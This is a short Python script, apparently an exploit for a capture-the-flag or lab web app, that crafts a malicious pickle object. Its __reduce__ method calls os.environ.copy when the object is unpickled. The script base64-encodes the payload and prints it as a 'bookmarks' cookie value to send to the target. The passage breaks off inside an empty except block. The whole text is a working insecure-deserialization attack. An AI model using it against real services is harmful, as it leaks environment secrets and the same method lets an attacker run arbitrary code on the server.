import pickle
import base64
import os

# Create a malicious class that will execute os.environ when unpickled
class Exploit:
    def __reduce__(self):
        # Return a tuple of (callable, args)
        # This will call os.environ.copy() to get all environment variables
        return (os.environ.copy, ())

# Create an instance of our exploit class
exploit = Exploit()

# Serialize using pickle protocol 4 (for 'gAR' prefix compatibility)
payload = pickle.dumps(exploit, protocol=4)

# Base64 encode the payload
encoded_payload = base64.b64encode(payload).decode()

print("="*60)
print("MALICIOUS PICKLE PAYLOAD GENERATED")
print("="*60)
print(f"Raw pickle bytes: {payload}")
print(f"\nBase64 encoded payload: {encoded_payload}")
print(f"\nCookie value to use: bookmarks={encoded_payload}")

# Verify by decoding and showing what it would execute
decoded = base64.b64decode(encoded_payload)
print(f"\nVerification - decoded bytes: {decoded}")
print(f"Starts with 'gAR': {decoded[:3] == b'gAR'}")

# Test unpickling to see what it returns (for demonstration)
try:
    result = pickle.loads(decoded)
    print(f"\nUnpickle result type: {type(result)}")
    print(f"Unpickle result: {result}")
except Exception as e:
